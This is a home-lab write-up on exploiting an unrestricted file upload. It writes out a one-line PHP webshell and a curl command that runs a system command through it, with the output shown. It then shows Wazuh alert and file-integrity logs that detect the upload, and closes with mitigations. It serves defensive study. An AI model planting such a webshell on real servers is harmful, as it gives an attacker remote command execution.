# 03 — Unrestricted Upload and Webshell

## Objective

Show how an unrestricted file upload can be used to place a server-side executable file in a web-accessible directory.

## Commands

After authenticating with the privileged account (`hacker`), prepare the test file and upload it through the application:

```bash
echo "<?php system($_REQUEST['cmd']); ?>" > malicious.php
```

![](/docs/images/upload-malicious.png)
## Execution and expected result

The vulnerable application accepts the file despite the misleading MIME type. If the upload directory is executable and web-accessible, the request returns the command output.


```bash
┌──(kali㉿kali)-[~]
└─$ curl -G "http://10.10.10.1/uploads/malicious.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(dev)

```

## Wazuh view

```json
{
  "_index": "wazuh-alerts-4.x-2026.10.14",
  "_id": "Sx6APKEBBPd67aPAJKZ2",
  "_version": 1,
  "_score": null,
  "_source": {
    "input": {
      "type": "log"
    },
    "agent": {
      "ip": "10.10.20.10",
      "name": "reverse-proxy",
      "id": "002"
    },
    "manager": {
      "name": "wazuh-server"
    },
    "data": {
      "protocol": "POST",
      "srcip": "10.10.10.10",
      "id": "500",
      "url": "/upload.php"
    },
    "rule": {
      "firedtimes": 2,
      "mail": false,
      "level": 5,
      "description": "Web server 500 error code (Internal Error).",
      "groups": [
        "web",
        "accesslog",
        "system_error"
      ],
      "id": "31122"
    },
    "location": "/var/log/nginx/access.log",
    "decoder": {
      "name": "web-accesslog"
    },
    "id": "1792016391.69313438",
    "full_log": "10.10.10.10 - - [14/Oct/2026:22:19:51 +0000] \"POST /upload.php HTTP/1.1\" 500 171 \"http://10.10.10.1/admin/uploads\" \"Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\"",
    "timestamp": "2026-10-14T22:19:51.567+0000"
  },
  "fields": {
    "timestamp": [
      "2026-10-14T22:19:51.567Z"
    ]
  },
  "highlight": {
    "location": [
      "@opensearch-dashboards-highlighted-field@/var/log/nginx/access.log@/opensearch-dashboards-highlighted-field@"
    ]
  },
  "sort": [
    1792016391567
  ]
}
```
Ignore the `500` code error, what matters the most is that the upload has been successful as we can see with the log below on `ubuntu-server`.
```json
{
  "_index": "wazuh-alerts-4.x-2026.10.14",
  "_id": "SR6APKEBBPd67aPAJKZ2",
  "_version": 1,
  "_score": null,
  "_source": {
    "input": {
      "type": "log"
    },
    "agent": {
      "ip": "192.168.1.2",
      "name": "ubuntu-server",
      "id": "001"
    },
    "manager": {
      "name": "wazuh-server"
    },
    "data": {
      "srcip": "10.10.10.10",
      "extra_data": "35",
      "url": "malicious.php"
    },
    "rule": {
      "firedtimes": 1,
      "mail": false,
      "level": 3,
      "description": "Successful file upload: malicious.php (35 bytes) from 10.10.10.10",
      "groups": [
        "web_upload",
        "php_app"
      ],
      "id": "100107"
    },
    "location": "/var/www/logs/app.log",
    "decoder": {
      "name": "test1"
    },
    "id": "1792016391.69312586",
    "full_log": "[2026-10-14 22:19:51] [IP: 10.10.10.10] [STATUS: SUCCESS] File 'malicious.php' uploaded (35 bytes)",
    "timestamp": "2026-10-14T22:19:51.434+0000"
  },
  "fields": {
    "timestamp": [
      "2026-10-14T22:19:51.434Z"
    ]
  },
  "highlight": {
    "location": [
      "@opensearch-dashboards-highlighted-field@/var/www/logs/app.log@/opensearch-dashboards-highlighted-field@"
    ]
  },
  "sort": [
    1792016391434
  ]
}
```
I deployed a FIM (file integrity monitoring) which is a feature of Wazuh allowing me to check If a file was added/deleted/modified and as we can see here below:
```json
{
  "_index": "wazuh-alerts-4.x-2026.10.14",
  "_id": "7x7CPKEBBPd67aPAAKYU",
  "_score": null,
  "_source": {
    "syscheck": {
      "uname_after": "root",
      "mtime_after": "2026-10-14T23:31:43",
      "size_after": "29",
      "gid_after": "0",
      "mode": "realtime",
      "path": "/var/www/html/uploads/malicious.php",
      "sha1_after": "c826ad3676b9b7614142278747ce3f5c2e81bef3",
      "gname_after": "root",
      "uid_after": "0",
      "perm_after": "rw-r--r--",
      "event": "added",
      "md5_after": "8eaf4b27374434bb91d3b4e744466a32",
      "sha256_after": "4c172012032e35d22fad809e5e7a6a9f19a41993200b3c04fa076b885a7c71dd",
      "inode_after": 1442186
    },
    "input": {
      "type": "log"
    },
    "agent": {
      "ip": "192.168.1.2",
      "name": "ubuntu-server",
      "id": "001"
    },
    "manager": {
      "name": "wazuh-server"
    },
    "rule": {
      "firedtimes": 1,
      "mail": false,
      "level": 5,
      "pci_dss": [
        "11.5"
      ],
      "hipaa": [
        "164.312.c.1",
        "164.312.c.2"
      ],
      "tsc": [
        "PI1.4",
        "PI1.5",
        "CC6.1",
        "CC6.8",
        "CC7.2",
        "CC7.3"
      ],
      "description": "File added to the system.",
      "groups": [
        "ossec",
        "syscheck",
        "syscheck_entry_added",
        "syscheck_file"
      ],
      "id": "554",
      "nist_800_53": [
        "SI.7"
      ],
      "gpg13": [
        "4.11"
      ],
      "gdpr": [
        "II_5.1.f"
      ]
    },
    "location": "syscheck",
    "decoder": {
      "name": "syscheck_new_entry"
    },
    "id": "1792020703.69383650",
    "full_log": "File '/var/www/html/uploads/malicious.php' added\nMode: realtime\n",
    "timestamp": "2026-10-14T23:31:43.875+0000"
  },
  "fields": {
    "syscheck.mtime_after": [
      "2026-10-14T23:31:43.000Z"
    ],
    "timestamp": [
      "2026-10-14T23:31:43.875Z"
    ]
  },
  "sort": [
    1792020703875
  ]
}
```
## Mitigation

- Allow only required file extensions and validate the actual file type.
- Generate server-side filenames and reject executable extensions.
- Store uploads outside the web root.
- Disable script execution in the upload directory.
- Monitor upload directories with Wazuh FIM.